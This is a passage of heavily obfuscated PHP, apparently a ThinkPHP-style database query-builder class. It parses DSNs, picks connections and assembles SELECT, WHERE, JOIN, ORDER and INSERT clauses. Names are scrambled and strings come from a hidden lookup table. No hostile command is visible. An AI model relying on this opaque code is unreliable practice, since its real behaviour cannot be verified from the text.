"\x53\105\x4c\x45\x43\124\x25\104\111\123\124\x49\116\x43\124\45\x20\x25\106\111\x45\x4c\104\x25\x20\x46\122\117\x4d\x20\x25\124\x41\102\x4c\105\45\45\112\117\111\x4e\x25\x25\127\x48\105\x52\x45\x25\45\107\x52\117\x55\120\45\45\110\x41\x56\x49\116\107\x25\x25\117\122\x44\105\x52\45\45\114\111\x4d\x49\124\45\x20\45\125\116\111\x4f\116\45\45\x43\117\115\115\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $²µ¾ïİ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Î·Ü›öğ][1059], $²µ¾ïİ); } public function factory($šÒÔ÷¼á = '') { $¼ÊºÌ¿ =& $_SERVER[Î·Ü›öğ]; $šÒÔ÷¼á = $this->parseConfig($šÒÔ÷¼á); if (empty($šÒÔ÷¼á[$¼ÊºÌ¿[1060]])) { think_exception(think_lang($¼ÊºÌ¿[1061])); } $this->dbType = ucwords(strtolower($šÒÔ÷¼á[$¼ÊºÌ¿[1060]])); $ŞÏ³‘€ˆ = $¼ÊºÌ¿[1062] . $this->dbType; if (class_exists($ŞÏ³‘€ˆ)) { $Í©µèæı = new $ŞÏ³‘€ˆ($šÒÔ÷¼á); if ($¼ÊºÌ¿[1063] != strtolower($šÒÔ÷¼á[$¼ÊºÌ¿[1060]])) { $Í©µèæı->dbType = strtoupper($this->dbType); } else { $Í©µèæı->dbType = $this->_getDsnType($šÒÔ÷¼á[$¼ÊºÌ¿[1015]]); } } else { think_exception(think_lang($¼ÊºÌ¿[1064]) . $¼ÊºÌ¿[1065] . $ŞÏ³‘€ˆ); } return $Í©µèæı; } public function __call($·ù×§“ü, $Ö¸œÊÙ¨) { if (method_exists($this, $·ù×§“ü)) { return call_user_func_array(array($this, $·ù×§“ü), $Ö¸œÊÙ¨); } } protected function _getDsnType($†Ø‡™¨Ş) { $™†“å¨” = explode($_SERVER[Î·Ü›öğ][4], $†Ø‡™¨Ş); $»Î÷ºŸş = strtoupper(trim($™†“å¨”[0])); return $»Î÷ºŸş; } private function parseConfig($ØÅ¯Ğ› = '') { $ÒçÅè½ =& $_SERVER[Î·Ü›öğ]; if (!empty($ØÅ¯Ğ›) && is_string($ØÅ¯Ğ›)) { $ØÅ¯Ğ› = $this->parseDSN($ØÅ¯Ğ›); } elseif (is_array($ØÅ¯Ğ›)) { $ØÅ¯Ğ› = array_change_key_case($ØÅ¯Ğ›); $ØÅ¯Ğ› = array($ÒçÅè½[1060] => $ØÅ¯Ğ›[$ÒçÅè½[1066]], $ÒçÅè½[987] => $ØÅ¯Ğ›[$ÒçÅè½[1067]], $ÒçÅè½[988] => $ØÅ¯Ğ›[$ÒçÅè½[1068]], $ÒçÅè½[985] => $ØÅ¯Ğ›[$ÒçÅè½[1069]], $ÒçÅè½[986] => $ØÅ¯Ğ›[$ÒçÅè½[1070]], $ÒçÅè½[21] => $ØÅ¯Ğ›[$ÒçÅè½[1071]], $ÒçÅè½[1015] => $ØÅ¯Ğ›[$ÒçÅè½[1072]], $ÒçÅè½[17] => isset($ØÅ¯Ğ›[$ÒçÅè½[1073]]) ? $ØÅ¯Ğ›[$ÒçÅè½[1073]] : array()); } elseif (empty($ØÅ¯Ğ›)) { if (think_config($ÒçÅè½[1074]) && $ÒçÅè½[1063] != strtolower(think_config($ÒçÅè½[1075]))) { $ØÅ¯Ğ› = $this->parseDSN(think_config($ÒçÅè½[1074])); } else { $ØÅ¯Ğ› = array($ÒçÅè½[1060] => think_config($ÒçÅè½[1075]), $ÒçÅè½[987] => think_config($ÒçÅè½[1076]), $ÒçÅè½[988] => think_config($ÒçÅè½[1077]), $ÒçÅè½[985] => think_config($ÒçÅè½[1078]), $ÒçÅè½[986] => think_config($ÒçÅè½[1079]), $ÒçÅè½[21] => think_config($ÒçÅè½[326]), $ÒçÅè½[1015] => think_config($ÒçÅè½[1074]), $ÒçÅè½[17] => think_config($ÒçÅè½[1080])); } } return $ØÅ¯Ğ›; } protected function initConnect($­¬½ƒÃ = true) { if (1 == think_config($_SERVER[Î·Ü›öğ][22])) { $this->_linkID = $this->multiConnect($­¬½ƒÃ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Ø­Ì”²Í => $ß™ÇÂºõ) { $this->_linkID = $ß™ÇÂºõ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‚çÙ¸ª = false) { $ìÄ¦×„ø =& $_SERVER[Î·Ü›öğ]; static $‰ĞİÊ×’ = array(); static $³Šó‡¢¹ = -1; if (empty($‰ĞİÊ×’)) { foreach ($this->config as $è¥œ€î => $Çîî‰ÀÃ) { $‰ĞİÊ×’[$è¥œ€î] = explode($ìÄ¦×„ø[50], $Çîî‰ÀÃ); } } if (think_config($ìÄ¦×„ø[1081])) { if ($‚çÙ¸ª || think_config($ìÄ¦×„ø[473]) === !0) { $Ğì–å¤ = floor(mt_rand(0, think_config($ìÄ¦×„ø[1082]) - 1)); $³Šó‡¢¹ = $Ğì–å¤; } else { if (is_numeric(think_config($ìÄ¦×„ø[1083]))) { $Ğì–å¤ = think_config($ìÄ¦×„ø[1083]); } else { $Ğì–å¤ = floor(mt_rand(think_config($ìÄ¦×„ø[1082]), count($‰ĞİÊ×’[$ìÄ¦×„ø[985]]) - 1)); } } } else { $Ğì–å¤ = floor(mt_rand(0, count($‰ĞİÊ×’[$ìÄ¦×„ø[985]]) - 1)); $³Šó‡¢¹ = $Ğì–å¤; } $Ğì–å¤ = $³Šó‡¢¹ !== -1 ? $³Šó‡¢¹ : $Ğì–å¤; $›¼¦¦± = array($ìÄ¦×„ø[987] => isset($‰ĞİÊ×’[$ìÄ¦×„ø[987]][$Ğì–å¤]) ? $‰ĞİÊ×’[$ìÄ¦×„ø[987]][$Ğì–å¤] : $‰ĞİÊ×’[$ìÄ¦×„ø[987]][0], $ìÄ¦×„ø[988] => isset($‰ĞİÊ×’[$ìÄ¦×„ø[988]][$Ğì–å¤]) ? $‰ĞİÊ×’[$ìÄ¦×„ø[988]][$Ğì–å¤] : $‰ĞİÊ×’[$ìÄ¦×„ø[988]][0], $ìÄ¦×„ø[985] => isset($‰ĞİÊ×’[$ìÄ¦×„ø[985]][$Ğì–å¤]) ? $‰ĞİÊ×’[$ìÄ¦×„ø[985]][$Ğì–å¤] : $‰ĞİÊ×’[$ìÄ¦×„ø[985]][0], $ìÄ¦×„ø[986] => isset($‰ĞİÊ×’[$ìÄ¦×„ø[986]][$Ğì–å¤]) ? $‰ĞİÊ×’[$ìÄ¦×„ø[986]][$Ğì–å¤] : $‰ĞİÊ×’[$ìÄ¦×„ø[986]][0], $ìÄ¦×„ø[21] => isset($‰ĞİÊ×’[$ìÄ¦×„ø[21]][$Ğì–å¤]) ? $‰ĞİÊ×’[$ìÄ¦×„ø[21]][$Ğì–å¤] : $‰ĞİÊ×’[$ìÄ¦×„ø[21]][0], $ìÄ¦×„ø[1015] => isset($‰ĞİÊ×’[$ìÄ¦×„ø[1015]][$Ğì–å¤]) ? $‰ĞİÊ×’[$ìÄ¦×„ø[1015]][$Ğì–å¤] : $‰ĞİÊ×’[$ìÄ¦×„ø[1015]][0], $ìÄ¦×„ø[17] => isset($‰ĞİÊ×’[$ìÄ¦×„ø[17]][$Ğì–å¤]) ? $‰ĞİÊ×’[$ìÄ¦×„ø[17]][$Ğì–å¤] : $‰ĞİÊ×’[$ìÄ¦×„ø[17]][0]); return $this->connect($›¼¦¦±, $Ğì–å¤); } public function parseDSN($ø€¢º¶œ) { $÷´İ÷úÚ =& $_SERVER[Î·Ü›öğ]; if (empty($ø€¢º¶œ)) { return !1; } $±Ô“ı†â = parse_url($ø€¢º¶œ); if ($±Ô“ı†â[$÷´İ÷úÚ[208]]) { $·ä‘ÀëÆ = array($÷´İ÷úÚ[1060] => $±Ô“ı†â[$÷´İ÷úÚ[208]], $÷´İ÷úÚ[987] => isset($±Ô“ı†â[$÷´İ÷úÚ[678]]) ? $±Ô“ı†â[$÷´İ÷úÚ[678]] : $÷´İ÷úÚ[12], $÷´İ÷úÚ[988] => isset($±Ô“ı†â[$÷´İ÷úÚ[1084]]) ? $±Ô“ı†â[$÷´İ÷úÚ[1084]] : $÷´İ÷úÚ[12], $÷´İ÷úÚ[985] => isset($±Ô“ı†â[$÷´İ÷úÚ[209]]) ? $±Ô“ı†â[$÷´İ÷úÚ[209]] : $÷´İ÷úÚ[12], $÷´İ÷úÚ[986] => isset($±Ô“ı†â[$÷´İ÷úÚ[210]]) ? $±Ô“ı†â[$÷´İ÷úÚ[210]] : $÷´İ÷úÚ[12], $÷´İ÷úÚ[21] => isset($±Ô“ı†â[$÷´İ÷úÚ[87]]) ? substr($±Ô“ı†â[$÷´İ÷úÚ[87]], 1) : $÷´İ÷úÚ[12]); } else { preg_match($÷´İ÷úÚ[1085], trim($ø€¢º¶œ), $†ÄŠªÍ); $·ä‘ÀëÆ = array($÷´İ÷úÚ[1060] => $†ÄŠªÍ[1], $÷´İ÷úÚ[987] => $†ÄŠªÍ[2], $÷´İ÷úÚ[988] => $†ÄŠªÍ[3], $÷´İ÷úÚ[985] => $†ÄŠªÍ[4], $÷´İ÷úÚ[986] => $†ÄŠªÍ[5], $÷´İ÷úÚ[21] => $†ÄŠªÍ[6]); } $·ä‘ÀëÆ[$÷´İ÷úÚ[1015]] = $÷´İ÷úÚ[12]; return $·ä‘ÀëÆ; } protected function debug() { $ú¥†É¯ =& $_SERVER[Î·Ü›öğ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ú¥†É¯[1086]; if (think_config($ú¥†É¯[1087])) { think_status($ú¥†É¯[1088]); think_trace($this->queryStr . $ú¥†É¯[1089] . think_status($ú¥†É¯[24], $ú¥†É¯[1088], 6) . $ú¥†É¯[1090], $ú¥†É¯[12], $ú¥†É¯[1091]); } } protected function parseLock($¤ã«°•û = false) { $íŸ™îİå =& $_SERVER[Î·Ü›öğ]; if (!$¤ã«°•û) { return $íŸ™îİå[12]; } if ($íŸ™îİå[1017] == $this->dbType) { return $íŸ™îİå[1092]; } return $íŸ™îİå[1093]; } protected function parseSet($Šİòëù) { $Í’”Ô‡ä =& $_SERVER[Î·Ü›öğ]; foreach ($Šİòëù as $Ñğ·¢ı => $Â¬ÌÄøÓ) { if (is_array($Â¬ÌÄøÓ) && $Í’”Ô‡ä[374] == $Â¬ÌÄøÓ[0]) { $“Ÿè´[] = $this->parseKey($Ñğ·¢ı) . $Í’”Ô‡ä[517] . $Â¬ÌÄøÓ[1]; } elseif (is_scalar($Â¬ÌÄøÓ) || is_null($Â¬ÌÄøÓ)) { $“Ÿè´[] = $this->parseKey($Ñğ·¢ı) . $Í’”Ô‡ä[517] . $this->parseValue($Â¬ÌÄøÓ); } } return $Í’”Ô‡ä[1094] . implode($Í’”Ô‡ä[50], $“Ÿè´); } protected function bindParam($•ò¼¹Éı, $ÙôÜóùß) { $this->bind[$_SERVER[Î·Ü›öğ][4] . $•ò¼¹Éı] = $ÙôÜóùß; } protected function parseBind($™üã¤è—) { $™üã¤è— = array_merge($this->bind, $™üã¤è—); $this->bind = array(); return $™üã¤è—; } function parseKey(&$•ÑÀÌñ£, $”ÒˆÉ€ = true) { if ($”ÒˆÉ€) { $•ÑÀÌñ£ = $this->parseKeyCheck($•ÑÀÌñ£); } return $•ÑÀÌñ£; } function parseKeyCheck($ÕÏ¨‘Ä) { $ªª±üÛÀ =& $_SERVER[Î·Ü›öğ]; $ÕÏ¨‘Ä = trim($ÕÏ¨‘Ä); if (!preg_match($ªª±üÛÀ[1095], $ÕÏ¨‘Ä)) { think_exception($ªª±üÛÀ[1096] . $ÕÏ¨‘Ä); } return $ÕÏ¨‘Ä; } protected function parseValue($Øêñ¡ª÷) { $µÃ—õ =& $_SERVER[Î·Ü›öğ]; if (is_string($Øêñ¡ª÷)) { $Øêñ¡ª÷ = $µÃ—õ[1056] . $this->escapeString($Øêñ¡ª÷) . $µÃ—õ[1056]; } elseif (isset($Øêñ¡ª÷[0]) && is_string($Øêñ¡ª÷[0]) && strtolower($Øêñ¡ª÷[0]) == $µÃ—õ[374]) { $Øêñ¡ª÷ = $this->escapeString($Øêñ¡ª÷[1]); } elseif (is_array($Øêñ¡ª÷)) { $Øêñ¡ª÷ = array_map(array($this, $µÃ—õ[1057]), $Øêñ¡ª÷); } elseif (is_bool($Øêñ¡ª÷)) { $Øêñ¡ª÷ = $Øêñ¡ª÷ ? $µÃ—õ[91] : $µÃ—õ[231]; } elseif (is_null($Øêñ¡ª÷)) { $Øêñ¡ª÷ = $µÃ—õ[106]; } return $Øêñ¡ª÷; } protected function parseField($È°÷ò˜ı) { $âİÄ’À˜ =& $_SERVER[Î·Ü›öğ]; if (is_string($È°÷ò˜ı) && strpos($È°÷ò˜ı, $âİÄ’À˜[50])) { $È°÷ò˜ı = explode($âİÄ’À˜[50], $È°÷ò˜ı); } if (is_array($È°÷ò˜ı)) { $ìäÀï‡™ = array(); foreach ($È°÷ò˜ı as $¾—é“í¼ => $¢°ä‹è¡) { if (!is_numeric($¾—é“í¼)) { $ìäÀï‡™[] = $this->parseKey($¾—é“í¼, !1) . $âİÄ’À˜[1097] . $this->parseKey($¢°ä‹è¡); } else { $ìäÀï‡™[] = $this->parseKey($¢°ä‹è¡); } } $«³óÙåö = implode($âİÄ’À˜[50], $ìäÀï‡™); } elseif (is_string($È°÷ò˜ı) && !empty($È°÷ò˜ı)) { $«³óÙåö = $È°÷ò˜ı; } else { $«³óÙåö = $âİÄ’À˜[223]; } return $«³óÙåö; } protected function parseTable($Æ»ê«Ÿò) { $ù•ó€óË =& $_SERVER[Î·Ü›öğ]; if (is_array($Æ»ê«Ÿò)) { $¦³ä”ô¬ = array(); foreach ($Æ»ê«Ÿò as $¨áÅ‡‡ó => $›úã„åŒ) { if (!is_numeric($¨áÅ‡‡ó)) { $¦³ä”ô¬[] = $this->parseKey($¨áÅ‡‡ó) . $ù•ó€óË[53] . $this->parseKey($›úã„åŒ); } else { $¦³ä”ô¬[] = $this->parseKey($¨áÅ‡‡ó); } } $Æ»ê«Ÿò = $¦³ä”ô¬; } elseif (is_string($Æ»ê«Ÿò)) { if (strstr($Æ»ê«Ÿò, $ù•ó€óË[53])) { return $Æ»ê«Ÿò; } $Æ»ê«Ÿò = explode($ù•ó€óË[50], $Æ»ê«Ÿò); array_walk($Æ»ê«Ÿò, array($this, $ù•ó€óË[1005])); } return $ù•ó€óË[999] . trim(implode($ù•ó€óË[1098], $Æ»ê«Ÿò), $ù•ó€óË[463]) . $ù•ó€óË[999]; } protected function parseWhere($“àë‘) { $Ô—Üøµ =& $_SERVER[Î·Ü›öğ]; $ª“ø†šÆ = $Ô—Üøµ[12]; if (is_string($“àë‘)) { $ª“ø†šÆ = $“àë‘; } else { $ë•±€Ò² = isset($“àë‘[$Ô—Üøµ[1099]]) ? strtoupper($“àë‘[$Ô—Üøµ[1099]]) : $Ô—Üøµ[12]; if (in_array($ë•±€Ò², array($Ô—Üøµ[1100], $Ô—Üøµ[1101], $Ô—Üøµ[1102]))) { $ë•±€Ò² = $Ô—Üøµ[53] . $ë•±€Ò² . $Ô—Üøµ[53]; unset($“àë‘[$Ô—Üøµ[1099]]); } else { $ë•±€Ò² = $Ô—Üøµ[1103]; } foreach ($“àë‘ as $Ç£Øôé³ => $ë…ºÈÈş) { $ª“ø†šÆ .= $Ô—Üøµ[357]; if (is_numeric($Ç£Øôé³)) { $Ç£Øôé³ = $Ô—Üøµ[1104]; } if (0 === strpos($Ç£Øôé³, $Ô—Üøµ[11])) { $ª“ø†šÆ .= $this->parseThinkWhere($Ç£Øôé³, $ë…ºÈÈş); } else { if (!preg_match($Ô—Üøµ[1105], trim($Ç£Øôé³))) { think_exception(think_lang($Ô—Üøµ[1106]) . $Ô—Üøµ[4] . $Ç£Øôé³); } $ñœÈÔÂß = is_array($ë…ºÈÈş) && isset($ë…ºÈÈş[$Ô—Üøµ[1107]]); $Ç£Øôé³ = trim($Ç£Øôé³); if (strpos($Ç£Øôé³, $Ô—Üøµ[215])) { $È¸Ëñ£¼ = explode($Ô—Üøµ[215], $Ç£Øôé³); $¤õÓ¸„ = array(); foreach ($È¸Ëñ£¼ as $øù„¥­ => $—Æûû¨¤) { $‡ô£ò = $ñœÈÔÂß ? $ë…ºÈÈş[$øù„¥­] : $ë…ºÈÈş; $¤õÓ¸„[] = $Ô—Üøµ[340] . $this->parseWhereItem($this->parseKey($—Æûû¨¤), $‡ô£ò) . $Ô—Üøµ[1004]; } $ª“ø†šÆ .= implode($Ô—Üøµ[1108], $¤õÓ¸„); } elseif (strpos($Ç£Øôé³, $Ô—Üøµ[287])) { $È¸Ëñ£¼ = explode($Ô—Üøµ[287], $Ç£Øôé³); $¤õÓ¸„ = array(); foreach ($È¸Ëñ£¼ as $øù„¥­ => $—Æûû¨¤) { $‡ô£ò = $ñœÈÔÂß ? $ë…ºÈÈş[$øù„¥­] : $ë…ºÈÈş; $¤õÓ¸„[] = $Ô—Üøµ[340] . $this->parseWhereItem($this->parseKey($—Æûû¨¤), $‡ô£ò) . $Ô—Üøµ[1004]; } $ª“ø†šÆ .= implode($Ô—Üøµ[1103], $¤õÓ¸„); } else { $ª“ø†šÆ .= $this->parseWhereItem($this->parseKey($Ç£Øôé³), $ë…ºÈÈş); } } $ª“ø†šÆ .= $Ô—Üøµ[358] . $ë•±€Ò²; } $ª“ø†šÆ = substr($ª“ø†šÆ, 0, -strlen($ë•±€Ò²)); } return empty($ª“ø†šÆ) ? $Ô—Üøµ[12] : $Ô—Üøµ[1109] . $ª“ø†šÆ; } protected function parseWhereItem($«‡Éê, $áÉô›ò) { $µš£¬ŒÊ =& $_SERVER[Î·Ü›öğ]; $³–¼Ö£¢ = $µš£¬ŒÊ[12]; if (is_array($áÉô›ò)) { if (is_string($áÉô›ò[0])) { $®¡ÙÎ = strtolower($áÉô›ò[0]); if (in_array($áÉô›ò[0], array($µš£¬ŒÊ[517], $µš£¬ŒÊ[1110], $µš£¬ŒÊ[1111], $µš£¬ŒÊ[1112], $µš£¬ŒÊ[1113], $µš£¬ŒÊ[1114]))) { $³–¼Ö£¢ .= $«‡Éê . $µš£¬ŒÊ[53] . $áÉô›ò[0] . $µš£¬ŒÊ[53] . $this->parseValue($áÉô›ò[1]); } elseif (preg_match($µš£¬ŒÊ[1115], $áÉô›ò[0])) { $³–¼Ö£¢ .= $«‡Éê . $µš£¬ŒÊ[53] . $this->exp[$®¡ÙÎ] . $µš£¬ŒÊ[53] . $this->parseValue($áÉô›ò[1]); } elseif (preg_match($µš£¬ŒÊ[1116], $áÉô›ò[0])) { if (is_array($áÉô›ò[1])) { $úƒÌ¢ø = isset($áÉô›ò[2]) ? strtoupper($áÉô›ò[2]) : $µš£¬ŒÊ[1101]; if (in_array($úƒÌ¢ø, array($µš£¬ŒÊ[1100], $µš£¬ŒÊ[1101], $µš£¬ŒÊ[1102]))) { $¢«Ë·ÅÛ = array(); foreach ($áÉô›ò[1] as $ÀÕòíØ¼) { $¢«Ë·ÅÛ[] = $«‡Éê . $µš£¬ŒÊ[53] . $this->exp[$®¡ÙÎ] . $µš£¬ŒÊ[53] . $this->parseValue($ÀÕòíØ¼); } $³–¼Ö£¢ .= $µš£¬ŒÊ[340] . implode($µš£¬ŒÊ[53] . $úƒÌ¢ø . $µš£¬ŒÊ[53], $¢«Ë·ÅÛ) . $µš£¬ŒÊ[1004]; } } else { $³–¼Ö£¢ .= $«‡Éê . $µš£¬ŒÊ[53] . $this->exp[$®¡ÙÎ] . $µš£¬ŒÊ[53] . $this->parseValue($áÉô›ò[1]); } } elseif ($µš£¬ŒÊ[374] == $®¡ÙÎ) { $³–¼Ö£¢ .= $µš£¬ŒÊ[1002] . $«‡Éê . $µš£¬ŒÊ[53] . $áÉô›ò[1] . $µš£¬ŒÊ[1117]; } elseif (preg_match($µš£¬ŒÊ[1118], $áÉô›ò[0])) { $³–¼Ö£¢ .= $áÉô›ò[0]; } elseif (preg_match($µš£¬ŒÊ[1119], $áÉô›ò[0])) { if (isset($áÉô›ò[2]) && $µš£¬ŒÊ[374] == $áÉô›ò[2]) { $³–¼Ö£¢ .= $«‡Éê . $µš£¬ŒÊ[53] . $this->exp[$®¡ÙÎ] . $µš£¬ŒÊ[53] . $áÉô›ò[1]; } else { if (is_string($áÉô›ò[1])) { $áÉô›ò[1] = explode($µš£¬ŒÊ[50], $áÉô›ò[1]); } $…õØÌß = implode($µš£¬ŒÊ[50], $this->parseValue($áÉô›ò[1])); $³–¼Ö£¢ .= $«‡Éê . $µš£¬ŒÊ[53] . $this->exp[$®¡ÙÎ] . $µš£¬ŒÊ[1002] . $…õØÌß . $µš£¬ŒÊ[1004]; } } elseif (preg_match($µš£¬ŒÊ[1120], $áÉô›ò[0])) { $¿Óş±Å = is_string($áÉô›ò[1]) ? explode($µš£¬ŒÊ[50], $áÉô›ò[1]) : $áÉô›ò[1]; $³–¼Ö£¢ .= $µš£¬ŒÊ[1002] . $«‡Éê . $µš£¬ŒÊ[53] . $this->exp[$®¡ÙÎ] . $µš£¬ŒÊ[53] . $this->parseValue($¿Óş±Å[0]) . $µš£¬ŒÊ[1103] . $this->parseValue($¿Óş±Å[1]) . $µš£¬ŒÊ[358]; } else { think_exception(think_lang($µš£¬ŒÊ[1106]) . $µš£¬ŒÊ[4] . $áÉô›ò[0]); } } else { $ÇÚÔø€ò = count($áÉô›ò); $°Ë‚à°” = $µš£¬ŒÊ[12]; if (is_string($áÉô›ò[$ÇÚÔø€ò - 1])) { $°Ë‚à°” = isset($áÉô›ò[$ÇÚÔø€ò - 1]) ? strtoupper($áÉô›ò[$ÇÚÔø€ò - 1]) : $µš£¬ŒÊ[12]; if (in_array($°Ë‚à°”, array($µš£¬ŒÊ[1100], $µš£¬ŒÊ[1101], $µš£¬ŒÊ[1102]))) { $ÇÚÔø€ò = $ÇÚÔø€ò - 1; } } else { $°Ë‚à°” = $µš£¬ŒÊ[1100]; } for ($ÕÄÉ’ = 0; $ÕÄÉ’ < $ÇÚÔø€ò; $ÕÄÉ’++) { $¿Óş±Å = is_array($áÉô›ò[$ÕÄÉ’]) ? $áÉô›ò[$ÕÄÉ’][1] : $áÉô›ò[$ÕÄÉ’]; if ($µš£¬ŒÊ[374] == strtolower($áÉô›ò[$ÕÄÉ’][0])) { $³–¼Ö£¢ .= $µš£¬ŒÊ[340] . $«‡Éê . $µš£¬ŒÊ[53] . $¿Óş±Å . $µš£¬ŒÊ[1117] . $°Ë‚à°” . $µš£¬ŒÊ[53]; } else { $öŞŒ²í” = is_array($áÉô›ò[$ÕÄÉ’]) ? $this->exp[strtolower($áÉô›ò[$ÕÄÉ’][0])] : $µš£¬ŒÊ[517]; if (!$öŞŒ²í” && is_array($áÉô›ò[$ÕÄÉ’]) && in_array($áÉô›ò[$ÕÄÉ’][0], array($µš£¬ŒÊ[517], $µš£¬ŒÊ[1110], $µš£¬ŒÊ[1111], $µš£¬ŒÊ[1112], $µš£¬ŒÊ[1113], $µš£¬ŒÊ[1114]))) { $öŞŒ²í” = $áÉô›ò[$ÕÄÉ’][0]; } $³–¼Ö£¢ .= $µš£¬ŒÊ[340] . $«‡Éê . $µš£¬ŒÊ[53] . $öŞŒ²í” . $µš£¬ŒÊ[53] . $this->parseValue($¿Óş±Å) . $µš£¬ŒÊ[1117] . $°Ë‚à°” . $µš£¬ŒÊ[53]; } } $³–¼Ö£¢ = substr($³–¼Ö£¢, 0, -4); } } else { $³–¼Ö£¢ .= $«‡Éê . $µš£¬ŒÊ[1121] . $this->parseValue($áÉô›ò); } return $³–¼Ö£¢; } protected function parseThinkWhere($´˜ñ ı, $÷ö‘ô¤Ø) { $–ë”æÃ =& $_SERVER[Î·Ü›öğ]; $‘ó²›ùÓ = $–ë”æÃ[12]; switch ($´˜ñ ı) { case $–ë”æÃ[429]: $‘ó²›ùÓ = $÷ö‘ô¤Ø; break; case $–ë”æÃ[1104]: $‘ó²›ùÓ = is_string($÷ö‘ô¤Ø) ? $÷ö‘ô¤Ø : substr($this->parseWhere($÷ö‘ô¤Ø), 6); break; case $–ë”æÃ[1122]: parse_str($÷ö‘ô¤Ø, $êí¬™¹); if (isset($êí¬™¹[$–ë”æÃ[1099]])) { $ó´‡Î˜ß = $–ë”æÃ[53] . strtoupper($êí¬™¹[$–ë”æÃ[1099]]) . $–ë”æÃ[53]; unset($êí¬™¹[$–ë”æÃ[1099]]); } else { $ó´‡Î˜ß = $–ë”æÃ[1103]; } $ïã¡¹ßÍ = array(); foreach ($êí¬™¹ as $îì¬×ß² => $£ö¬±ÏÍ) { $ïã¡¹ßÍ[] = $this->parseKey($îì¬×ß²) . $–ë”æÃ[1121] . $this->parseValue($£ö¬±ÏÍ); } $‘ó²›ùÓ = implode($ó´‡Î˜ß, $ïã¡¹ßÍ); break; } return $‘ó²›ùÓ; } protected function parseLimit($ì÷Ü­ğ¢) { $æÙî’Šµ =& $_SERVER[Î·Ü›öğ]; return !empty($ì÷Ü­ğ¢) ? $æÙî’Šµ[51] . $ì÷Ü­ğ¢ . $æÙî’Šµ[53] : $æÙî’Šµ[12]; } protected function parseJoin($¾¥‰Î¥÷) { $óûÀƒÆÏ =& $_SERVER[Î·Ü›öğ]; $æÇ±‹·« = $óûÀƒÆÏ[12]; if (!empty($¾¥‰Î¥÷)) { if (is_array($¾¥‰Î¥÷)) { foreach ($¾¥‰Î¥÷ as $²…Öµå => $Ú°Ë™¹) { if (!1 !== stripos($Ú°Ë™¹, $óûÀƒÆÏ[1123])) { $æÇ±‹·« .= $óûÀƒÆÏ[53] . $Ú°Ë™¹; } else { $æÇ±‹·« .= $óûÀƒÆÏ[1124] . $Ú°Ë™¹; } } } else { $æÇ±‹·« .= $óûÀƒÆÏ[1124] . $¾¥‰Î¥÷; } } $æÇ±‹·« = preg_replace($óûÀƒÆÏ[1125], think_config($óûÀƒÆÏ[1029]) . $óûÀƒÆÏ[1126], $æÇ±‹·«); return $æÇ±‹·«; } protected function parseOrder($í··¯ñ‘) { $Şº ¾ô¡ =& $_SERVER[Î·Ü›öğ]; if (is_array($í··¯ñ‘)) { $ÑŞ‹¼Ì = array(); foreach ($í··¯ñ‘ as $¸›„ã« => $È Çûî ) { if (is_numeric($¸›„ã«)) { $ÑŞ‹¼Ì[] = $this->parseKey($È Çûî ); } else { $È Çûî  = in_array(strtoupper(trim($È Çûî )), array($Şº ¾ô¡[1127], $Şº ¾ô¡[1128])) ? $Şº ¾ô¡[53] . $È Çûî  : $Şº ¾ô¡[12]; if (preg_match($Şº ¾ô¡[1129], $¸›„ã«)) { $ÑŞ‹¼Ì[] = $this->parseKey($¸›„ã«) . $È Çûî ; } else { think_exception($Şº ¾ô¡[1130] . $¸›„ã«); } } } $í··¯ñ‘ = implode($Şº ¾ô¡[50], $ÑŞ‹¼Ì); } return !empty($í··¯ñ‘) ? $Şº ¾ô¡[1131] . $í··¯ñ‘ : $Şº ¾ô¡[12]; } protected function parseGroup($íô¶Ññ±) { $©é¤à¶’ =& $_SERVER[Î·Ü›öğ]; return !empty($íô¶Ññ±) ? $©é¤à¶’[1132] . $íô¶Ññ± : $©é¤à¶’[12]; } protected function parseHaving($„üí¿Ó˜) { $îâñ”œ— =& $_SERVER[Î·Ü›öğ]; return !empty($„üí¿Ó˜) ? $îâñ”œ—[1133] . $„üí¿Ó˜ : $îâñ”œ—[12]; } protected function parseComment($½²çŞÃ) { $”æ¯ïï¯ =& $_SERVER[Î·Ü›öğ]; return !empty($½²çŞÃ) ? $”æ¯ïï¯[1134] . $½²çŞÃ . $”æ¯ïï¯[1135] : $”æ¯ïï¯[12]; } protected function parseDistinct($·ã°ğ÷š) { $Í­ºµß× =& $_SERVER[Î·Ü›öğ]; return !empty($·ã°ğ÷š) ? $Í­ºµß×[1136] : $Í­ºµß×[12]; } protected function parseUnion($ú¾—“¡Ş) { $ì×¦ü¨½ =& $_SERVER[Î·Ü›öğ]; if (empty($ú¾—“¡Ş)) { return $ì×¦ü¨½[12]; } if (isset($ú¾—“¡Ş[$ì×¦ü¨½[425]])) { $å¨Á¨İß = $ì×¦ü¨½[1137]; unset($ú¾—“¡Ş[$ì×¦ü¨½[425]]); } else { $å¨Á¨İß = $ì×¦ü¨½[1138]; } foreach ($ú¾—“¡Ş as $ÀÀ½ÆıË) { $•«½¬Ù›[] = $å¨Á¨İß . (is_array($ÀÀ½ÆıË) ? $this->buildSelectSql($ÀÀ½ÆıË) : $ÀÀ½ÆıË); } return implode($ì×¦ü¨½[53], $•«½¬Ù›); } public function insert($÷ÙÈ ­·, $‘êÉÙäı = array(), $ûˆ¦¯Ñ¦ = false) { $Èãûæ„û =& $_SERVER[Î·Ü›öğ]; $„¾½¤ˆÈ = $î‚½˜ôÁ = array(); $this->model = $‘êÉÙäı[$Èãûæ„û[361]]; foreach ($÷ÙÈ ­· as $—´‰øüÓ => $¹­··ƒÊ) { if (is_array($¹­··ƒÊ) && $Èãûæ„û[374] == $¹­··ƒÊ[0]) { $î‚½˜ôÁ[] = $this->parseKey($—´‰øüÓ); $„¾½¤ˆÈ[] = $¹­··ƒÊ[1]; } elseif (is_scalar($¹­··ƒÊ) || is_null($¹­··ƒÊ)) { $î‚½˜ôÁ[] = $this->parseKey($—´‰øüÓ); $„¾½¤ˆÈ[] = $this->parseValue($¹­··ƒÊ); } } $¹ƒÏªÅÛ = ($ûˆ¦¯Ñ¦ ? $Èãûæ„û[1006] : $Èãûæ„û[1007]) . $Èãûæ„û[1008] . 